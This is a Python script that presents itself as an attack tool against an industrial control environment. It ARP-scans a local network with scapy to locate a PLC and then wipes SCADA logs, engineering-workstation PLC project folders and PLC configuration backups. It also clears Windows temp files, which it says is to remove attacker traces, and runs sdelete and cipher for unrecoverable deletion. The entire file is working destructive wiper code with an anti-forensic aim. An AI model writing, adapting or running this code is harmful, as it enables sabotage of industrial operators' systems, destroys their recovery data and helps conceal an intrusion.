import os
import subprocess
import shutil
import time
import scapy.all as sc

# Step 1: Find the PLC's IP Address (Assuming the PLC exists within local network)
def find_plc_ip():
    print("[*] Scanning network for PLC IP address...")
    try:
        # Using ARP scan to detect the PLC (Filter by MAC Vendor if known)
        arp_scan = sc.ARP(pdst="192.168.1.1/24")  # Change subnet if different
        ether = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp_scan
        result = sc.srp(packet, timeout=3, verbose=False)[0]

        for sent, received in result:
            print(f"[+] Possible PLC Found: {received.psrc} - MAC: {received.hwsrc}")

        plc_ip = result[0][1].psrc if result else None
        if plc_ip:
            print(f"[✔] PLC IP Identified: {plc_ip}")
            return plc_ip
        else:
            print("[X] Unable to identify PLC IP.")
            return None

    except Exception as e:
        print(f"[!!] Error in finding PLC IP: {str(e)}")
        return None

# Step 2: Data Destruction on Engineering Workstation
def destroy_data():
    print("[*] Executing Data Destruction...")

    critical_paths = [
        r"C:\Program Files\SCADA\Logs",  # Logs related to SCADA/PLC programming
        r"C:\Users\Engineer\Desktop\PLC_Projects",  # Engineering Workstation Files
        r"C:\Backup\PLC",  # Backup Directories for PLC Configurations
        r"C:\Windows\Temp",  # Windows Temp Files (to clear attacker traces)
    ]

    for path in critical_paths:
        if os.path.exists(path):
            try:
                shutil.rmtree(path)  # Non-recoverable deletion
                print(f"[✔] Deleted: {path}")
            except Exception as e:
                print(f"[X] Failed to delete {path}: {str(e)}")
        else:
            print(f"[-] Path Not Found: {path}")

    # Securely delete individual files if needed  
    secure_delete_cmds = [
        r"sdelete -p 3 C:\Backup\PLC\backup_01.bak",
        r"cipher /w:C:\Users\Engineer\Desktop\PLC_Projects"
    ]

    for cmd in secure_delete_cmds:
        try:
            subprocess.run(cmd, shell=True, check=True)
            print(f"[✔] Securely executed: {cmd}")
        except Exception as e:
            print(f"[X] Failed: {cmd} ({str(e)})")

    print("[!] Data Destruction Complete.")

# Main Execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        destroy_data()
    else:
        print("[X] PLC IP not found. Cannot proceed with data destruction.")